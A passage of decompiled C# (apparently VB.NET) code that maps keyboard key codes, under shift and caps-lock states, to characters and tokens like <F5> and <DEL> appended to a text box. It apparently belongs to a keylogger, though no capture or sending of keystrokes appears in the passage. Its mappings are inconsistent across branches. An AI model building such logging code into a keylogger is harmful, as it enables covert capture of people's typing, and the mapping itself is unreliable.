		//IL_3f2a: Invalid comparison between Unknown and I4
		//IL_3f31: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f34: Invalid comparison between Unknown and I4
		//IL_3f3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f3e: Invalid comparison between Unknown and I4
		//IL_3f67: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f6a: Invalid comparison between Unknown and I4
		//IL_3f71: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f74: Invalid comparison between Unknown and I4
		//IL_3f7b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f7e: Invalid comparison between Unknown and I4
		//IL_3f85: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f88: Invalid comparison between Unknown and I4
		//IL_3f8f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f92: Invalid comparison between Unknown and I4
		//IL_3f99: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f9c: Invalid comparison between Unknown and I4
		//IL_3fc5: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fc8: Invalid comparison between Unknown and I4
		//IL_3fcf: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fd2: Invalid comparison between Unknown and I4
		//IL_3ffb: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ffe: Invalid comparison between Unknown and I4
		//IL_4002: Unknown result type (might be due to invalid IL or missing references)
		//IL_4005: Invalid comparison between Unknown and I4
		if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "a");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "b");
			}
			else if ((int)Key != 67)
			{
				if ((int)Key != 68)
				{
					if ((int)Key == 69)
					{
						TextBox1.set_Text(TextBox1.get_Text() + "e");
					}
					else if ((int)Key != 70)
					{
						if ((int)Key != 71)
						{
							if ((int)Key != 72)
							{
								if ((int)Key != 73)
								{
									if ((int)Key != 74)
									{
										if ((int)Key != 75)
										{
											if ((int)Key != 76)
											{
												if ((int)Key == 77)
												{
													TextBox1.set_Text(TextBox1.get_Text() + "m");
												}
												else if ((int)Key == 78)
												{
													TextBox1.set_Text(TextBox1.get_Text() + "n");
												}
												else if ((int)Key != 79)
												{
													if ((int)Key != 80)
													{
														if ((int)Key != 81)
														{
															if ((int)Key == 82)
															{
																TextBox1.set_Text(TextBox1.get_Text() + "r");
															}
															else if ((int)Key != 83)
															{
																if ((int)Key != 84)
																{
																	if ((int)Key != 85)
																	{
																		if ((int)Key == 86)
																		{
																			TextBox1.set_Text(TextBox1.get_Text() + "v");
																		}
																		else if ((int)Key == 87)
																		{
																			TextBox1.set_Text(TextBox1.get_Text() + "w");
																		}
																		else if ((int)Key == 88)
																		{
																			TextBox1.set_Text(TextBox1.get_Text() + "x");
																		}
																		else if ((int)Key != 89)
																		{
																			if ((int)Key != 90)
																			{
																				if ((int)Key == 48)
																				{
																					TextBox1.set_Text(TextBox1.get_Text() + "0");
																				}
																				else if ((int)Key == 49)
																				{
																					TextBox1.set_Text(TextBox1.get_Text() + "1");
																				}
																				else if ((int)Key != 50)
																				{
																					if ((int)Key != 51)
																					{
																						if ((int)Key == 52)
																						{
																							TextBox1.set_Text(TextBox1.get_Text() + "4");
																						}
																						else if ((int)Key == 53)
																						{
																							TextBox1.set_Text(TextBox1.get_Text() + "5");
																						}
																						else if ((int)Key != 54)
																						{
																							if ((int)Key != 55)
																							{
																								if ((int)Key != 56)
																								{
																									if ((int)Key != 57)
																									{
																										if ((int)Key != 96)
																										{
																											if ((int)Key == 97)
																											{
																												TextBox1.set_Text(TextBox1.get_Text() + "1");
																											}
																											else if ((int)Key != 98)
																											{
																												if ((int)Key != 99)
																												{
																													if ((int)Key != 100)
																													{
																														if ((int)Key != 101)
																														{
																															if ((int)Key != 102)
																															{
																																if ((int)Key != 103)
																																{
																																	if ((int)Key != 104)
																																	{
																																		if ((int)Key != 105)
																																		{
																																			if ((int)Key != 188)
																																			{
																																				if ((int)Key != 189)
																																				{
																																					if ((int)Key != 222)
																																					{
																																						if ((int)Key != 219)
																																						{
																																							if ((int)Key != 221)
																																							{
																																								if ((int)Key != 191)
																																								{
																																									if ((int)Key != 220)
																																									{
																																										if ((int)Key == 186)
																																										{
																																											TextBox1.set_Text(TextBox1.get_Text() + ";");
																																										}
																																										else if ((int)Key != 190)
																																										{
																																											if ((int)Key != 192)
																																											{
																																												if ((int)Key == 32)
																																												{
																																													TextBox1.set_Text(TextBox1.get_Text() + " ");
																																												}
																																												else if ((int)Key != 13)
																																												{
																																													if ((int)Key != 112)
																																													{
																																														if ((int)Key == 113)
																																														{
																																															TextBox1.set_Text(TextBox1.get_Text() + "<F2>");
																																														}
																																														else if ((int)Key == 114)
																																														{
																																															TextBox1.set_Text(TextBox1.get_Text() + "<F3>");
																																														}
																																														else if ((int)Key != 115)
																																														{
																																															if ((int)Key != 116)
																																															{
																																																if ((int)Key != 117)
																																																{
																																																	if ((int)Key != 118)
																																																	{
																																																		if ((int)Key != 119)
																																																		{
																																																			if ((int)Key != 120)
																																																			{
																																																				if ((int)Key == 121)
																																																				{
																																																					TextBox1.set_Text(TextBox1.get_Text() + "<F10>");
																																																				}
																																																				else if ((int)Key != 122)
																																																				{
																																																					if ((int)Key != 123)
																																																					{
																																																						if ((int)Key == 46)
																																																						{
																																																							TextBox1.set_Text(TextBox1.get_Text() + "<DEL>");
																																																						}
																																																						else if ((int)Key != 8)
																																																						{
																																																							if ((int)Key != 40)
																																																							{
																																																								if ((int)Key != 38)
																																																								{
																																																									if ((int)Key != 37)
																																																									{
																																																										if ((int)Key == 39)
																																																										{
																																																											TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																										}
																																																										else if ((int)Key == 9)
																																																										{
																																																											TextBox1.set_Text(TextBox1.get_Text() + "<TAB>");
																																																										}
																																																										else if ((int)Key == 35)
																																																										{
																																																											TextBox1.set_Text(TextBox1.get_Text() + "<END>");
																																																										}
																																																										else if ((int)Key == 27)
																																																										{
																																																											TextBox1.set_Text(TextBox1.get_Text() + "<ESC>");
																																																										}
																																																										else if ((int)Key != 111)
																																																										{
																																																											if ((int)Key != 110)
																																																											{
																																																												if ((int)Key != 109)
																																																												{
																																																													if ((int)Key != 107)
																																																													{
																																																														if ((int)Key == 106)
																																																														{
																																																															TextBox1.set_Text(TextBox1.get_Text() + "*");
																																																														}
																																																													}
																																																													else
																																																													{
																																																														TextBox1.set_Text(TextBox1.get_Text() + "+");
																																																													}
																																																												}
																																																												else
																																																												{
																																																													TextBox1.set_Text(TextBox1.get_Text() + "-");
																																																												}
																																																											}
																																																											else
																																																											{
																																																												TextBox1.set_Text(TextBox1.get_Text() + ".");
																																																											}
																																																										}
																																																										else
																																																										{
																																																											TextBox1.set_Text(TextBox1.get_Text() + "/");
																																																										}
																																																									}
																																																									else
																																																									{
																																																										TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																									}
																																																								}
																																																								else
																																																								{
																																																									TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																								}
																																																							}
																																																							else
																																																							{
																																																								TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																							}
																																																						}
																																																						else
																																																						{
																																																							TextBox1.set_Text(TextBox1.get_Text() + "<DEL>");
																																																						}
																																																					}
																																																					else
																																																					{
																																																						TextBox1.set_Text(TextBox1.get_Text() + "<F12>");
																																																					}
																																																				}
																																																				else
																																																				{
																																																					TextBox1.set_Text(TextBox1.get_Text() + "<F11>");
																																																				}
																																																			}
																																																			else
																																																			{
																																																				TextBox1.set_Text(TextBox1.get_Text() + "<F9>");
																																																			}
																																																		}
																																																		else
																																																		{
																																																			TextBox1.set_Text(TextBox1.get_Text() + "<F8>");
																																																		}
																																																	}
																																																	else
																																																	{
																																																		TextBox1.set_Text(TextBox1.get_Text() + "<F7>");
																																																	}
																																																}
																																																else
																																																{
																																																	TextBox1.set_Text(TextBox1.get_Text() + "<F6>");
																																																}
																																															}
																																															else
																																															{
																																																TextBox1.set_Text(TextBox1.get_Text() + "<F5>");
																																															}
																																														}
																																														else
																																														{
																																															TextBox1.set_Text(TextBox1.get_Text() + "<F4>");
																																														}
																																													}
																																													else
																																													{
																																														TextBox1.set_Text(TextBox1.get_Text() + "<F1>");
																																													}
																																												}
																																												else
																																												{
																																													TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
																																												}
																																											}
																																											else
																																											{
																																												TextBox1.set_Text(TextBox1.get_Text() + "`");
																																											}
																																										}
																																										else
																																										{
																																											TextBox1.set_Text(TextBox1.get_Text() + ".");
																																										}
																																									}
																																									else
																																									{
																																										TextBox1.set_Text(TextBox1.get_Text() + "\\");
																																									}
																																								}
																																								else
																																								{
																																									TextBox1.set_Text(TextBox1.get_Text() + "/");
																																								}
																																							}
																																							else
																																							{
																																								TextBox1.set_Text(TextBox1.get_Text() + "]");
																																							}
																																						}
																																						else
																																						{
																																							TextBox1.set_Text(TextBox1.get_Text() + "[");
																																						}
																																					}
																																					else
																																					{
																																						TextBox1.set_Text(TextBox1.get_Text() + "'");
																																					}
																																				}
																																				else
																																				{
																																					TextBox1.set_Text(TextBox1.get_Text() + "-");
																																				}
																																			}
																																			else
																																			{
																																				TextBox1.set_Text(TextBox1.get_Text() + ",");
																																			}
																																		}
																																		else
																																		{
																																			TextBox1.set_Text(TextBox1.get_Text() + "9");
																																		}
																																	}
																																	else
																																	{
																																		TextBox1.set_Text(TextBox1.get_Text() + "8");
																																	}
																																}
																																else
																																{
																																	TextBox1.set_Text(TextBox1.get_Text() + "7");
																																}
																															}
																															else
																															{
																																TextBox1.set_Text(TextBox1.get_Text() + "6");
																															}
																														}
																														else
																														{
																															TextBox1.set_Text(TextBox1.get_Text() + "5");
																														}
																													}
																													else
																													{
																														TextBox1.set_Text(TextBox1.get_Text() + "4");
																													}
																												}
																												else
																												{
																													TextBox1.set_Text(TextBox1.get_Text() + "3");
																												}
																											}
																											else
																											{
																												TextBox1.set_Text(TextBox1.get_Text() + "2");
																											}
																										}
																										else
																										{
																											TextBox1.set_Text(TextBox1.get_Text() + "0");
																										}
																									}
																									else
																									{
																										TextBox1.set_Text(TextBox1.get_Text() + "9");
																									}
																								}
																								else
																								{
																									TextBox1.set_Text(TextBox1.get_Text() + "8");
																								}
																							}
																							else
																							{
																								TextBox1.set_Text(TextBox1.get_Text() + "7");
																							}
																						}
																						else
																						{
																							TextBox1.set_Text(TextBox1.get_Text() + "6");
																						}
																					}
																					else
																					{
																						TextBox1.set_Text(TextBox1.get_Text() + "3");
																					}
																				}
																				else
																				{
																					TextBox1.set_Text(TextBox1.get_Text() + "2");
																				}
																			}
																			else
																			{
																				TextBox1.set_Text(TextBox1.get_Text() + "z");
																			}
																		}
																		else
																		{
																			TextBox1.set_Text(TextBox1.get_Text() + "y");
																		}
																	}
																	else
																	{
																		TextBox1.set_Text(TextBox1.get_Text() + "u");
																	}
																}
																else
																{
																	TextBox1.set_Text(TextBox1.get_Text() + "t");
																}
															}
															else
															{
																TextBox1.set_Text(TextBox1.get_Text() + "s");
															}
														}
														else
														{
															TextBox1.set_Text(TextBox1.get_Text() + "q");
														}
													}
													else
													{
														TextBox1.set_Text(TextBox1.get_Text() + "p");
													}
												}
												else
												{
													TextBox1.set_Text(TextBox1.get_Text() + "o");
												}
											}
											else
											{
												TextBox1.set_Text(TextBox1.get_Text() + "l");
											}
										}
										else
										{
											TextBox1.set_Text(TextBox1.get_Text() + "k");
										}
									}
									else
									{
										TextBox1.set_Text(TextBox1.get_Text() + "j");
									}
								}
								else
								{
									TextBox1.set_Text(TextBox1.get_Text() + "i");
								}
							}
							else
							{
								TextBox1.set_Text(TextBox1.get_Text() + "h");
							}
						}
						else
						{
							TextBox1.set_Text(TextBox1.get_Text() + "g");
						}
					}
					else
					{
						TextBox1.set_Text(TextBox1.get_Text() + "f");
					}
				}
				else
				{
					TextBox1.set_Text(TextBox1.get_Text() + "d");
				}
			}
			else
			{
				TextBox1.set_Text(TextBox1.get_Text() + "c");
			}
		}
		else if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key != 65)
			{
				if ((int)Key != 66)
				{
					if ((int)Key == 67)
					{
						TextBox1.set_Text(TextBox1.get_Text() + "C");
					}
					else if ((int)Key != 68)
					{
						if ((int)Key != 69)
						{
							if ((int)Key != 70)
							{
								if ((int)Key != 71)
								{
									if ((int)Key != 72)
									{
										if ((int)Key != 73)
										{
											if ((int)Key == 74)
											{
												TextBox1.set_Text(TextBox1.get_Text() + "J");
											}
											else if ((int)Key != 75)
											{
												if ((int)Key != 76)
												{
													if ((int)Key == 77)
													{
														TextBox1.set_Text(TextBox1.get_Text() + "M");
													}
													else if ((int)Key != 78)
													{
														if ((int)Key != 79)
														{
															if ((int)Key == 80)
															{
																TextBox1.set_Text(TextBox1.get_Text() + "P");
															}
															else if ((int)Key != 81)
															{
																if ((int)Key == 82)
																{
																	TextBox1.set_Text(TextBox1.get_Text() + "R");
																}
																else if ((int)Key != 83)
																{
																	if ((int)Key != 84)
																	{
																		if ((int)Key != 85)
																		{
																			if ((int)Key != 86)
																			{
																				if ((int)Key == 87)
																				{
																					TextBox1.set_Text(TextBox1.get_Text() + "W");
																				}
																				else if ((int)Key != 88)
																				{
																					if ((int)Key == 89)
																					{
																						TextBox1.set_Text(TextBox1.get_Text() + "Y");
																					}
																					else if ((int)Key != 90)
																					{
																						if ((int)Key == 48)
																						{
																							TextBox1.set_Text(TextBox1.get_Text() + "0");
																						}
																						else if ((int)Key != 49)
																						{
																							if ((int)Key != 50)
																							{
																								if ((int)Key == 51)
																								{
																									TextBox1.set_Text(TextBox1.get_Text() + "3");
																								}
																								else if ((int)Key != 52)
																								{
																									if ((int)Key != 53)
																									{
																										if ((int)Key != 54)
																										{
																											if ((int)Key != 55)
																											{
																												if ((int)Key == 56)
																												{
																													TextBox1.set_Text(TextBox1.get_Text() + "8");
																												}
																												else if ((int)Key != 57)
																												{
																													if ((int)Key != 96)
																													{
																														if ((int)Key != 97)
																														{
																															if ((int)Key != 98)
																															{
																																if ((int)Key != 99)
																																{
																																	if ((int)Key != 100)
																																	{
																																		if ((int)Key != 101)
																																		{
																																			if ((int)Key == 102)
																																			{
																																				TextBox1.set_Text(TextBox1.get_Text() + "6");
																																			}
																																			else if ((int)Key != 103)
																																			{
																																				if ((int)Key != 104)
																																				{
																																					if ((int)Key != 105)
																																					{
																																						if ((int)Key != 188)
																																						{
																																							if ((int)Key != 189)
																																							{
																																								if ((int)Key != 222)
																																								{
																																									if ((int)Key != 219)
																																									{
																																										if ((int)Key == 221)
																																										{
																																											TextBox1.set_Text(TextBox1.get_Text() + "]");
																																										}
																																										else if ((int)Key != 191)
																																										{
																																											if ((int)Key != 220)
																																											{
																																												if ((int)Key == 186)
																																												{
																																													TextBox1.set_Text(TextBox1.get_Text() + ";");
																																												}
																																												else if ((int)Key == 190)
																																												{
																																													TextBox1.set_Text(TextBox1.get_Text() + ".");
																																												}
																																												else if ((int)Key != 192)
																																												{
																																													if ((int)Key != 32)
																																													{
																																														if ((int)Key != 13)
																																														{
																																															if ((int)Key != 112)
																																															{
																																																if ((int)Key == 113)
																																																{
																																																	TextBox1.set_Text(TextBox1.get_Text() + "<F2>");
																																																}
																																																else if ((int)Key != 114)
																																																{
																																																	if ((int)Key != 115)
																																																	{
																																																		if ((int)Key == 116)
																																																		{
																																																			TextBox1.set_Text(TextBox1.get_Text() + "<F5>");
																																																		}
																																																		else if ((int)Key != 117)
																																																		{
																																																			if ((int)Key != 118)
																																																			{
																																																				if ((int)Key != 119)
																																																				{
																																																					if ((int)Key != 120)
																																																					{
																																																						if ((int)Key != 121)
																																																						{
																																																							if ((int)Key != 122)
																																																							{
																																																								if ((int)Key == 123)
																																																								{
																																																									TextBox1.set_Text(TextBox1.get_Text() + "<F12>");
																																																								}
																																																								else if ((int)Key != 46)
																																																								{
																																																									if ((int)Key == 8)
																																																									{
																																																										TextBox1.set_Text(TextBox1.get_Text() + "<DEL>");
																																																									}
																																																									else if ((int)Key != 40)
																																																									{
																																																										if ((int)Key != 38)
																																																										{
																																																											if ((int)Key != 37)
																																																											{
																																																												if ((int)Key == 39)
																																																												{
																																																													TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																												}
																																																												else if ((int)Key != 9)
																																																												{
																																																													if ((int)Key != 35)
																																																													{
																																																														if ((int)Key != 27)
																																																														{
																																																															if ((int)Key != 111)
																																																															{
																																																																if ((int)Key != 110)
																																																																{
																																																																	if ((int)Key != 109)
																																																																	{
																																																																		if ((int)Key != 107)
																																																																		{
																																																																			if ((int)Key == 106)
																																																																			{
																																																																				TextBox1.set_Text(TextBox1.get_Text() + "*");
																																																																			}
																																																																		}
																																																																		else
																																																																		{
																																																																			TextBox1.set_Text(TextBox1.get_Text() + "+");
																																																																		}
																																																																	}
																																																																	else
																																																																	{
																																																																		TextBox1.set_Text(TextBox1.get_Text() + "-");
																																																																	}
																																																																}
																																																																else
																																																																{
																																																																	TextBox1.set_Text(TextBox1.get_Text() + ".");
																																																																}
																																																															}
																																																															else
																																																															{
																																																																TextBox1.set_Text(TextBox1.get_Text() + "/");
																																																															}
																																																														}
																																																														else
																																																														{
																																																															TextBox1.set_Text(TextBox1.get_Text() + "<ESC>");
																																																														}
																																																													}
																																																													else
																																																													{
																																																														TextBox1.set_Text(TextBox1.get_Text() + "<END>");
																																																													}
																																																												}
																																																												else
																																																												{
																																																													TextBox1.set_Text(TextBox1.get_Text() + "<TAB>");
																																																												}
																																																											}
																																																											else
																																																											{
																																																												TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																											}
																																																										}
																																																										else
																																																										{
																																																											TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																										}
																																																									}
																																																									else
																																																									{
																																																										TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																									}
																																																								}
																																																								else
																																																								{
																																																									TextBox1.set_Text(TextBox1.get_Text() + "<DEL>");
																																																								}
																																																							}
																																																							else
																																																							{
																																																								TextBox1.set_Text(TextBox1.get_Text() + "<F11>");
																																																							}
																																																						}
																																																						else
																																																						{
																																																							TextBox1.set_Text(TextBox1.get_Text() + "<F10>");
																																																						}
																																																					}
																																																					else
																																																					{
																																																						TextBox1.set_Text(TextBox1.get_Text() + "<F9>");
																																																					}
																																																				}
																																																				else
																																																				{
																																																					TextBox1.set_Text(TextBox1.get_Text() + "<F8>");
																																																				}
																																																			}
																																																			else
																																																			{
																																																				TextBox1.set_Text(TextBox1.get_Text() + "<F7>");
																																																			}
																																																		}
																																																		else
																																																		{
																																																			TextBox1.set_Text(TextBox1.get_Text() + "<F6>");
																																																		}
																																																	}
																																																	else
																																																	{
																																																		TextBox1.set_Text(TextBox1.get_Text() + "<F4>");
																																																	}
																																																}
																																																else
																																																{
																																																	TextBox1.set_Text(TextBox1.get_Text() + "<F3>");
																																																}
																																															}
																																															else
																																															{
																																																TextBox1.set_Text(TextBox1.get_Text() + "<F1>");
																																															}
																																														}
																																														else
																																														{
																																															TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
																																														}
																																													}
																																													else
																																													{
																																														TextBox1.set_Text(TextBox1.get_Text() + " ");
																																													}
																																												}
																																												else
																																												{
																																													TextBox1.set_Text(TextBox1.get_Text() + "`");
																																												}
																																											}
																																											else
																																											{
																																												TextBox1.set_Text(TextBox1.get_Text() + "\\");
																																											}
																																										}
																																										else
																																										{
																																											TextBox1.set_Text(TextBox1.get_Text() + "/");
																																										}
																																									}
																																									else
																																									{
																																										TextBox1.set_Text(TextBox1.get_Text() + "[");
																																									}
																																								}
																																								else
																																								{
																																									TextBox1.set_Text(TextBox1.get_Text() + "'");
																																								}
																																							}
																																							else
																																							{
																																								TextBox1.set_Text(TextBox1.get_Text() + "-");
																																							}
																																						}
																																						else
																																						{
																																							TextBox1.set_Text(TextBox1.get_Text() + ",");
																																						}
																																					}
																																					else
																																					{
																																						TextBox1.set_Text(TextBox1.get_Text() + "9");
																																					}
																																				}
																																				else
																																				{
																																					TextBox1.set_Text(TextBox1.get_Text() + "8");
																																				}
																																			}
																																			else
																																			{
																																				TextBox1.set_Text(TextBox1.get_Text() + "7");
																																			}
																																		}
																																		else
																																		{
																																			TextBox1.set_Text(TextBox1.get_Text() + "5");
																																		}
																																	}
																																	else
																																	{
																																		TextBox1.set_Text(TextBox1.get_Text() + "4");
																																	}
																																}
																																else
																																{
																																	TextBox1.set_Text(TextBox1.get_Text() + "3");
																																}
																															}
																															else
																															{
																																TextBox1.set_Text(TextBox1.get_Text() + "2");
																															}
																														}
																														else
																														{
																															TextBox1.set_Text(TextBox1.get_Text() + "1");
																														}
																													}
																													else
																													{
																														TextBox1.set_Text(TextBox1.get_Text() + "0");
																													}
																												}
																												else
																												{
																													TextBox1.set_Text(TextBox1.get_Text() + "9");
																												}
																											}
																											else
																											{
																												TextBox1.set_Text(TextBox1.get_Text() + "7");
																											}
																										}
																										else
																										{
																											TextBox1.set_Text(TextBox1.get_Text() + "6");
																										}
																									}
																									else
																									{
																										TextBox1.set_Text(TextBox1.get_Text() + "5");
																									}
																								}
																								else
																								{
																									TextBox1.set_Text(TextBox1.get_Text() + "4");
																								}
																							}
																							else
																							{
																								TextBox1.set_Text(TextBox1.get_Text() + "2");
																							}
																						}
																						else
																						{
																							TextBox1.set_Text(TextBox1.get_Text() + "1");
																						}
																					}
																					else
																					{
																						TextBox1.set_Text(TextBox1.get_Text() + "Z");
																					}
																				}
																				else
																				{
																					TextBox1.set_Text(TextBox1.get_Text() + "X");
																				}
																			}
																			else
																			{
																				TextBox1.set_Text(TextBox1.get_Text() + "V");
																			}
																		}
																		else
																		{
																			TextBox1.set_Text(TextBox1.get_Text() + "U");
																		}
																	}
																	else
																	{
																		TextBox1.set_Text(TextBox1.get_Text() + "T");
																	}
																}
																else
																{
																	TextBox1.set_Text(TextBox1.get_Text() + "S");
																}
															}
															else
															{
																TextBox1.set_Text(TextBox1.get_Text() + "Q");
															}
														}
														else
														{
															TextBox1.set_Text(TextBox1.get_Text() + "O");
														}
													}
													else
													{
														TextBox1.set_Text(TextBox1.get_Text() + "N");
													}
												}
												else
												{
													TextBox1.set_Text(TextBox1.get_Text() + "L");
												}
											}
											else
											{
												TextBox1.set_Text(TextBox1.get_Text() + "K");
											}
										}
										else
										{
											TextBox1.set_Text(TextBox1.get_Text() + "I");
										}
									}
									else
									{
										TextBox1.set_Text(TextBox1.get_Text() + "H");
									}
								}
								else
								{
									TextBox1.set_Text(TextBox1.get_Text() + "G");
								}
							}
							else
							{
								TextBox1.set_Text(TextBox1.get_Text() + "F");
							}
						}
						else
						{
							TextBox1.set_Text(TextBox1.get_Text() + "E");
						}
					}
					else
					{
						TextBox1.set_Text(TextBox1.get_Text() + "D");
					}
				}
				else
				{
					TextBox1.set_Text(TextBox1.get_Text() + "B");
				}
			}
			else
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
		}
		else if (!(((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock()))
		{
			if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
			{
				if ((int)Key != 49)
				{
					if ((int)Key != 50)
					{
						if ((int)Key != 51)
						{
							if ((int)Key != 52)
							{
								if ((int)Key != 53)
								{
									if ((int)Key != 54)
									{
										if ((int)Key != 55)
										{
											if ((int)Key != 56)
											{
												if ((int)Key != 57)
												{
													if ((int)Key != 48)
													{
														if ((int)Key != 65)
														{
															if ((int)Key != 66)
															{
																if ((int)Key == 67)
																{
																	TextBox1.set_Text(TextBox1.get_Text() + "c");
																}
																else if ((int)Key != 68)
																{
																	if ((int)Key == 69)
																	{
																		TextBox1.set_Text(TextBox1.get_Text() + "e");
																	}
																	else if ((int)Key == 70)
																	{
																		TextBox1.set_Text(TextBox1.get_Text() + "f");
																	}
																	else if ((int)Key != 71)
																	{
																		if ((int)Key == 72)
																		{
																			TextBox1.set_Text(TextBox1.get_Text() + "h");
																		}
																		else if ((int)Key == 73)
																		{
																			TextBox1.set_Text(TextBox1.get_Text() + "i");
																		}
																		else if ((int)Key == 74)
																		{
																			TextBox1.set_Text(TextBox1.get_Text() + "j");
																		}
																		else if ((int)Key == 75)
																		{
																			TextBox1.set_Text(TextBox1.get_Text() + "k");
																		}
																		else if ((int)Key != 76)
																		{
																			if ((int)Key != 77)
																			{
																				if ((int)Key != 78)
																				{
																					if ((int)Key != 79)
																					{
																						if ((int)Key != 80)
																						{
																							if ((int)Key != 81)
																							{
																								if ((int)Key != 82)
																								{
																									if ((int)Key == 83)
																									{
																										TextBox1.set_Text(TextBox1.get_Text() + "s");
																									}
																									else if ((int)Key == 84)
																									{
																										TextBox1.set_Text(TextBox1.get_Text() + "t");
																									}
																									else if ((int)Key != 85)
																									{
																										if ((int)Key != 86)
																										{
																											if ((int)Key != 87)
																											{
																												if ((int)Key != 88)
																												{
																													if ((int)Key == 89)
																													{
																														TextBox1.set_Text(TextBox1.get_Text() + "y");
																													}
																													else if ((int)Key != 90)
																													{
																														if ((int)Key != 188)
																														{
																															if ((int)Key != 189)
																															{
																																if ((int)Key == 222)
																																{
																																	TextBox1.set_Text(TextBox1.get_Text() + "'");
																																}
																																else if ((int)Key != 219)
																																{
																																	if ((int)Key != 221)
																																	{
																																		if ((int)Key != 191)
																																		{
																																			if ((int)Key != 220)
																																			{
																																				if ((int)Key == 186)
																																				{
																																					TextBox1.set_Text(TextBox1.get_Text() + ";");
																																				}
																																				else if ((int)Key == 190)
																																				{
																																					TextBox1.set_Text(TextBox1.get_Text() + ".");
																																				}
																																				else if ((int)Key != 192)
																																				{
																																					if ((int)Key != 32)
																																					{
																																						if ((int)Key == 13)
																																						{
																																							TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
																																						}
																																						else if ((int)Key != 112)
																																						{
																																							if ((int)Key != 113)
																																							{
																																								if ((int)Key != 114)
																																								{
																																									if ((int)Key != 115)
																																									{
																																										if ((int)Key == 116)
																																										{
																																											TextBox1.set_Text(TextBox1.get_Text() + "<F5>");
																																										}
																																										else if ((int)Key != 117)
																																										{
																																											if ((int)Key != 118)
																																											{
																																												if ((int)Key != 119)
																																												{
																																													if ((int)Key != 120)
																																													{
																																														if ((int)Key != 121)
																																														{
																																															if ((int)Key != 122)
																																															{
																																																if ((int)Key != 123)
																																																{
																																																	if ((int)Key == 46)
																																																	{
																																																		TextBox1.set_Text(TextBox1.get_Text() + "<DEL>");
																																																	}
																																																	else if ((int)Key != 8)
																																																	{
																																																		if ((int)Key != 40)
																																																		{
																																																			if ((int)Key == 38)
																																																			{
																																																				TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																			}
																																																			else if ((int)Key != 37)
																																																			{
																																																				if ((int)Key != 39)
																																																				{
																																																					if ((int)Key != 9)
																																																					{
																																																						if ((int)Key == 35)
																																																						{
																																																							TextBox1.set_Text(TextBox1.get_Text() + "<END>");
																																																						}
																																																						else if ((int)Key == 27)
																																																						{
																																																							TextBox1.set_Text(TextBox1.get_Text() + "<ESC>");
																																																						}
																																																						else if ((int)Key != 111)
																																																						{
																																																							if ((int)Key != 110)
																																																							{
																																																								if ((int)Key != 109)
																																																								{
																																																									if ((int)Key == 107)
																																																									{
																																																										TextBox1.set_Text(TextBox1.get_Text() + "+");
																																																									}
																																																									else if ((int)Key == 106)
																																																									{
																																																										TextBox1.set_Text(TextBox1.get_Text() + "*");
																																																									}
																																																								}
																																																								else
																																																								{
																																																									TextBox1.set_Text(TextBox1.get_Text() + "-");
																																																								}
																																																							}
																																																							else
																																																							{
																																																								TextBox1.set_Text(TextBox1.get_Text() + ".");
																																																							}
																																																						}
																																																						else
																																																						{
																																																							TextBox1.set_Text(TextBox1.get_Text() + "/");
																																																						}
																																																					}
																																																					else
																																																					{
																																																						TextBox1.set_Text(TextBox1.get_Text() + "<TAB>");
																																																					}
																																																				}
																																																				else
																																																				{
																																																					TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																				}
																																																			}
																																																			else
																																																			{
																																																				TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																			}
																																																		}
																																																		else
																																																		{
																																																			TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																		}
																																																	}
																																																	else
																																																	{
																																																		TextBox1.set_Text(TextBox1.get_Text() + "<DEL>");
																																																	}
																																																}
																																																else
																																																{
																																																	TextBox1.set_Text(TextBox1.get_Text() + "<F12>");
																																																}
																																															}
																																															else
																																															{
																																																TextBox1.set_Text(TextBox1.get_Text() + "<F11>");
																																															}
																																														}
																																														else
																																														{
																																															TextBox1.set_Text(TextBox1.get_Text() + "<F10>");
																																														}
																																													}
																																													else
																																													{
																																														TextBox1.set_Text(TextBox1.get_Text() + "<F9>");
																																													}
																																												}
																																												else
																																												{
																																													TextBox1.set_Text(TextBox1.get_Text() + "<F8>");
																																												}
																																											}
																																											else
																																											{
																																												TextBox1.set_Text(TextBox1.get_Text() + "<F7>");
																																											}
																																										}
																																										else
																																										{
																																											TextBox1.set_Text(TextBox1.get_Text() + "<F6>");
																																										}
																																									}
																																									else
																																									{
																																										TextBox1.set_Text(TextBox1.get_Text() + "<F4>");
																																									}
																																								}
																																								else
																																								{
																																									TextBox1.set_Text(TextBox1.get_Text() + "<F3>");
																																								}
																																							}
																																							else
																																							{
																																								TextBox1.set_Text(TextBox1.get_Text() + "<F2>");
																																							}
																																						}
																																						else
																																						{
																																							TextBox1.set_Text(TextBox1.get_Text() + "<F1>");
																																						}
																																					}
